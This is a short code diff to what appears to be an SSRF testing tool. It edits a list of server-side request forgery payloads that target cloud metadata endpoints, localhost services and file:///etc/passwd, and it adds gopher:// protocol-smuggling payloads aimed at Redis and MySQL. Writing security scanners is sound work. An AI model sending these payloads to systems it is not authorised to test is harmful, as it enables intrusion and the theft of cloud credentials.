@@ -31,13 +31,16 @@ URL_PARAMS = [
 # SSRF test payloads
 SSRF_PAYLOADS = [
     ("AWS Metadata",      "http://169.254.169.254/latest/meta-data/", "ami-id"),
-    ("GCP Metadata",      "http://metadata.google.internal/computeMetadata/v1/", ""),
+    ("GCP Metadata",      "http://metadata.google.internal/computeMetadata/v1/", "instance"),
     ("Azure Metadata",    "http://169.254.169.254/metadata/instance", "compute"),
     ("Localhost Admin",   "http://localhost/admin",                  "admin"),
     ("Localhost 8080",    "http://127.0.0.1:8080/",                 ""),
     ("Internal 192.168",  "http://192.168.1.1/",                    ""),
     ("File Read",         "file:///etc/passwd",                      "root:"),
     ("Dict Protocol",     "dict://localhost:11211/stats",            "STAT"),
+    # v38.0: Protocol Smuggling
+    ("Gopher Redis",      "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a", "redis_version"),
+    ("Gopher MySQL",      "gopher://127.0.0.1:3306/_",               ""),
 ]
 
 
